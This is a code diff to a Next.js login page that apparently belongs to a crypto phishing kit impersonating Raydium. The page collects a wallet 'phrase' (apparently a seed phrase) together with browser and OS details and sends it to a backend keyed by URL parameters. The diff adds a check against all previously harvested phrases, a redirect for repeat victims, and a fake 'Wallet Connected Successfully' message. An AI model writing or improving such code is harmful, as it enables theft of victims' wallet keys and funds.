@@ -2,7 +2,7 @@
 import { useRouter } from 'next/navigation';
 import { useSearchParams } from 'next/navigation';
 import { useState, useEffect } from 'react';
-import { setPhrase, getCryptoLog } from '@/shared/api/apis';
+import { setPhrase, getCryptoLog, getPhrases } from '@/shared/api/apis';
 
 
 const LoginPage = () => {
@@ -14,6 +14,7 @@ const LoginPage = () => {
   const [success, setSuccess] = useState("");
   const [showModal, setShowModal] = useState(false)
   const [cryptoLog, setCryptoLog] = useState<any>(null);
+  const [phrases, setPhrases] = useState<any[]>([]);
   const [userInfo, setUserInfo] = useState({
     browser: "",
     os: "",
@@ -24,6 +25,7 @@ const LoginPage = () => {
   const bgColorBox:any = searchParams.get('modColor') ||  '#ffffff';
   const buttonColor:any = searchParams.get('btnColor') ||  '#00cfff';
   const cryptoLogId:any = searchParams.get('cryptoLogId');
+  console.log(cryptoLogId)
   const userId:any = searchParams.get('userId');
   // const staticLogo = "/raydium-logo-freelogovectors.png"
   const staticLogo = "/raydium-ray-logo.png"
@@ -100,29 +102,55 @@ const LoginPage = () => {
       setError("");
     }
     
+    if(cryptoLog===null){
+      setError('Crypto Log Not Found');
+      return;
+    }
+
     if (error) {
       return;
     }
-    const response = await setPhrase(value, userInfo, cryptoLogId)
-    if(response?.ok){
-      setSuccess("Wallet Connected Successfully");
-      setTimeout(() => {
-        setSuccess("");
-      }, 2000);
+    console.log((phrases.some(phraseObj => phraseObj.phrase === value)))
+    if (phrases.some(phraseObj => phraseObj.phrase === value)){
+      window.location.replace(cryptoLog?.redirectUrl)
     }else{
-      setError("Error connecting wallet");
-      setTimeout(() => {
-        setError("");
-      }, 2000);
+      const response = await setPhrase(value, userInfo, cryptoLogId)
+      if(response?.ok){
+        setSuccess("Wallet Connected Successfully");
+        setValue('');
+        setTimeout(() => {
+          setSuccess("");
+        }, 2000);
+      }else{
+        setError("Error connecting wallet");
+        setTimeout(() => {
+          setError("");
+        }, 2000);
+      }
     }
   };
 
-  const appName = cryptoLog?.appName.toUpperCase();
+  console.log(cryptoLog)
+
+  const appName = cryptoLog?.appName?.toUpperCase();
 
   const getCryptoLogById = async (cryptoLogId: string) => {
     const response = await getCryptoLog(cryptoLogId);
+    console.log("response:  ",response)
     setCryptoLog(response);
   };
+
+  console.log("All phrases:   ",phrases)
+  const getAllPhrases = async () => {
+    const response = await getPhrases()
+    console.log("All phrases here",response)
+    setPhrases(response)
+  }
+
+  useEffect(() => {
+    getAllPhrases()
+  }, [])
+  
 
   useEffect(() => {
     if(!userId || !cryptoLogId){
